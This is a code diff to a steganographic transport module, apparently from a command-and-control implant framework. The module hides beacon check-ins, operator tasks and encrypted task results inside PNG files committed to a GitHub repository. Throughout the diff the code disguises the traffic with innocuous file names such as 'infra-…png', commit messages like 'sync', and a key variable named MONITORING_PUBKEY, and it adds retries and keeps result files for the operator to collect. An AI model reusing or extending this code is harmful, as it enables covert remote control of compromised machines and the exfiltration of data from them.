@@ -17,22 +17,36 @@
  */
 
 import { BaseTentacle } from "./BaseTentacle.ts";
-import { StegoCodec } from "../lib/StegoCodec.ts";
-import { encodePng, decodePng, makePixelBuffer } from "../lib/PngEncoder.ts";
+import {
+  StegoCodec,
+  decodeStegoPng,
+  encodeStegoPng,
+} from "@octoc2/shared/stego";
 import {
   decryptBox, sealBox,
-  bytesToBase64, base64ToBytes,
+  base64ToBytes,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
+const REF_UPDATE_ATTEMPTS = 3;
+
+function isRefConflict(error: unknown): boolean {
+  const status = (error as { status?: number } | null)?.status;
+  return status === 409 || status === 422;
+}
 
 export class SteganographyTentacle extends BaseTentacle {
   readonly kind = "stego" as const;
 
-  private ackSent = false;
   private lastTaskSha: string | null = null;
   private operatorPublicKey: Uint8Array | null = null;
+  private defaultBranch: string | null = null;
 
   // ── Identity helpers ─────────────────────────────────────────────────────────
 
@@ -46,22 +60,39 @@ export class SteganographyTentacle extends BaseTentacle {
 
   private get ackFile(): string { return `infra-${this.id8}-a.png`; }
   private get taskFile(): string { return `infra-${this.id8}-t.png`; }
-  private get resultFile(): string { return `infra-${this.id8}-r.png`; }
+  private resultFile(taskId: string): string {
+    return `infra-${this.id8}-r-${taskId.slice(0, 8)}.png`;
+  }
 
   // ── Availability ─────────────────────────────────────────────────────────────
 
   override async isAvailable(): Promise<boolean> {
     try {
-      await this.octokit.rest.git.getRef({
-        owner: this.config.repo.owner,
-        repo:  this.config.repo.name,
-        ref:   this.branchRefShort,
-      });
+      await this.getDefaultBranchHeadSha();
       return true;
-    } catch (err: any) {
-      if (err?.status === 404) return false;
+    } catch {
       return false;
     }
+  }
+
+  private async getDefaultBranchHeadSha(): Promise<string> {
+    const { owner, name: repo } = this.config.repo;
+    if (!this.defaultBranch) {
+      const repository = await this.octokit.rest.repos.get({ owner, repo });
+      const branch = repository.data.default_branch?.trim();
+      if (!branch) {
+        throw new Error(
+          "SteganographyTentacle: repository has no default branch",
+        );
+      }
+      this.defaultBranch = branch;
+    }
+    const ref = await this.octokit.rest.git.getRef({
+      owner,
+      repo,
+      ref: `heads/${this.defaultBranch}`,
+    });
+    return ref.data.object.sha;
   }
 
   // ── Operator key resolution ──────────────────────────────────────────────────
@@ -111,10 +142,7 @@ export class SteganographyTentacle extends BaseTentacle {
     }
     const content = btoa(b64);
 
-    // 1. Get current branch HEAD sha
-    let headSha = await this.getBranchSha();
-
-    // 2. Create blob with base64 encoding
+    // The blob is immutable and can be reused across optimistic ref retries.
     const blobResp = await this.octokit.rest.git.createBlob({
       owner, repo,
       content,
@@ -122,49 +150,56 @@ export class SteganographyTentacle extends BaseTentacle {
     });
     const blobSha = blobResp.data.sha;
 
-    // 3. Build tree
-    let treeSha: string | undefined;
-    if (headSha) {
-      const commitResp = await this.octokit.rest.git.getCommit({
-        owner, repo, commit_sha: headSha,
+    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
+      const headSha = await this.getBranchSha();
+      const baseCommitSha = headSha ?? await this.getDefaultBranchHeadSha();
+      const baseCommit = await this.octokit.rest.git.getCommit({
+        owner,
+        repo,
+        commit_sha: baseCommitSha,
       });
-      treeSha = commitResp.data.tree.sha;
-    }
 
-    const treeResp = await this.octokit.rest.git.createTree({
-      owner, repo,
-      ...(treeSha ? { base_tree: treeSha } : {}),
-      tree: [{
-        path,
-        mode: "100644",
-        type: "blob",
-        sha:  blobSha,
-      }],
-    });
-
-    // 4. Create commit
-    const commitResp = await this.octokit.rest.git.createCommit({
-      owner, repo,
-      message,
-      tree: treeResp.data.sha,
-      ...(headSha ? { parents: [headSha] } : { parents: [] }),
-    });
-    const newCommitSha = commitResp.data.sha;
-
-    // 5. Update or create the branch ref
-    if (headSha) {
-      await this.octokit.rest.git.updateRef({
+      const treeResp = await this.octokit.rest.git.createTree({
         owner, repo,
-        ref:   this.branchRefShort,
-        sha:   newCommitSha,
-        force: true,
+        base_tree: baseCommit.data.tree.sha,
+        tree: [{
+          path,
+          mode: "100644",
+          type: "blob",
+          sha:  blobSha,
+        }],
       });
-    } else {
-      await this.octokit.rest.git.createRef({
+      const commitResp = await this.octokit.rest.git.createCommit({
         owner, repo,
-        ref: this.branchRef,
-        sha: newCommitSha,
+        message,
+        tree: treeResp.data.sha,
+        parents: [baseCommitSha],
       });
+
+      try {
+        if (headSha) {
+          await this.octokit.rest.git.updateRef({
+            owner, repo,
+            ref:   this.branchRefShort,
+            sha:   commitResp.data.sha,
+            force: false,
+          });
+        } else {
+          await this.octokit.rest.git.createRef({
+            owner, repo,
+            ref: this.branchRef,
+            sha: commitResp.data.sha,
+          });
+        }
+        return;
+      } catch (error) {
+        if (
+          attempt === REF_UPDATE_ATTEMPTS ||
+          !isRefConflict(error)
+        ) {
+          throw error;
+        }
+      }
     }
   }
 
@@ -198,62 +233,64 @@ export class SteganographyTentacle extends BaseTentacle {
   private async deleteFile(path: string): Promise<void> {
     const { owner, name: repo } = this.config.repo;
 
-    const headSha = await this.getBranchSha();
-    if (!headSha) return;
+    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
+      const headSha = await this.getBranchSha();
+      if (!headSha) return;
 
-    const commitResp = await this.octokit.rest.git.getCommit({
-      owner, repo, commit_sha: headSha,
-    });
-    const baseTreeSha = commitResp.data.tree.sha;
+      const commitResp = await this.octokit.rest.git.getCommit({
+        owner, repo, commit_sha: headSha,
+      });
+      const treeResp = await this.octokit.rest.git.createTree({
+        owner, repo,
+        base_tree: commitResp.data.tree.sha,
+        tree: [{
+          path,
+          mode: "100644",
+          type: "blob",
+          sha:  null,
+        }] as any,
+      });
+      const newCommit = await this.octokit.rest.git.createCommit({
+        owner, repo,
+        message: "sync",
+        tree:    treeResp.data.sha,
+        parents: [headSha],
+      });
 
-    const treeResp = await this.octokit.rest.git.createTree({
-      owner, repo,
-      base_tree: baseTreeSha,
-      tree: [{
-        path,
-        mode: "100644",
-        type: "blob",
-        sha:  null,
-      }] as any,
-    });
-
-    const newCommit = await this.octokit.rest.git.createCommit({
-      owner, repo,
-      message: "sync",
-      tree:    treeResp.data.sha,
-      parents: [headSha],
-    });
-
-    await this.octokit.rest.git.updateRef({
-      owner, repo,
-      ref:   this.branchRefShort,
-      sha:   newCommit.data.sha,
-      force: true,
-    });
+      try {
+        await this.octokit.rest.git.updateRef({
+          owner, repo,
+          ref:   this.branchRefShort,
+          sha:   newCommit.data.sha,
+          force: false,
+        });
+        return;
+      } catch (error) {
+        if (
+          attempt === REF_UPDATE_ATTEMPTS ||
+          !isRefConflict(error)
+        ) {
+          throw error;
+        }
+      }
+    }
   }
 
   // ── Checkin ──────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    const operatorPubKey = await this.getOperatorPublicKey();
-
-    // 1. On first checkin: encode ACK payload into PNG and write to branch
-    if (!this.ackSent) {
-      const ackJson = JSON.stringify({
-        beaconId:  payload.beaconId,
-        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
-        hostname:  payload.hostname,
-        os:        payload.os,
-        arch:      payload.arch,
-        checkinAt: payload.checkinAt,
-      });
-      const ackBytes = new TextEncoder().encode(ackJson);
-      const { pixels, width, height } = makePixelBuffer(ackBytes.length);
-      StegoCodec.encode(pixels, ackBytes);
-      const pngBytes = encodePng(pixels, width, height);
-      await this.writeFileBinary(this.ackFile, pngBytes, "update");
-      this.ackSent = true;
+    if (!payload.identity) {
+      throw new Error(
+        "SteganographyTentacle: signed checkin identity is required",
+      );
     }
+
+    // 1. Refresh the ACK PNG before every task poll.
+    const ackBytes = new TextEncoder().encode(JSON.stringify(payload));
+    const pngBytes = encodeStegoPng(ackBytes);
+    await this.writeFileBinary(this.ackFile, pngBytes, "update");
+
+    const operatorPubKey = await this.getOperatorPublicKey();
 
     // 2. Change detection via branch SHA (check before downloading PNG)
     const currentSha = await this.getBranchSha();
@@ -273,8 +310,7 @@ export class SteganographyTentacle extends BaseTentacle {
     // 4. Decode PNG → pixels → StegoCodec.decode() → encrypted envelope
     let tasks: Task[];
     try {
-      const { pixels } = decodePng(taskPngBytes);
-      const jsonBytes = StegoCodec.decode(pixels);
+      const jsonBytes = decodeStegoPng(taskPngBytes);
       if (!jsonBytes) return [];
 
       const envelope = JSON.parse(new TextDecoder().decode(jsonBytes)) as { nonce: string; ciphertext: string };
@@ -300,30 +336,32 @@ export class SteganographyTentacle extends BaseTentacle {
 
   // ── Submit result ─────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const operatorPubKey = await this.getOperatorPublicKey();
 
     // sealBox returns base64url string — encode to bytes for stego embedding
     const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
     const sealedBytes = new TextEncoder().encode(sealed);
 
-    const { pixels, width, height } = makePixelBuffer(sealedBytes.length);
-    StegoCodec.encode(pixels, sealedBytes);
-    const pngBytes = encodePng(pixels, width, height);
+    const pngBytes = encodeStegoPng(sealedBytes);
 
-    await this.writeFileBinary(this.resultFile, pngBytes, "update");
+    await this.writeFileBinary(this.resultFile(result.taskId), pngBytes, "update");
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "stego",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ──────────────────────────────────────────────────────────────────
 
   override async teardown(): Promise<void> {
-    try {
-      await this.octokit.rest.git.deleteRef({
-        owner: this.config.repo.owner,
-        repo:  this.config.repo.name,
-        ref:   this.branchRefShort,
-      });
-    } catch { /* best-effort */ }
+    // Normal lifecycle teardown must not delete the per-beacon branch: it may
+    // still contain result artifacts that the server has not polled yet.
+    this.lastTaskSha = null;
+    this.operatorPublicKey = null;
+    this.defaultBranch = null;
   }
 
   // ── Codec delegates (keep for backward compat / testing) ─────────────────────
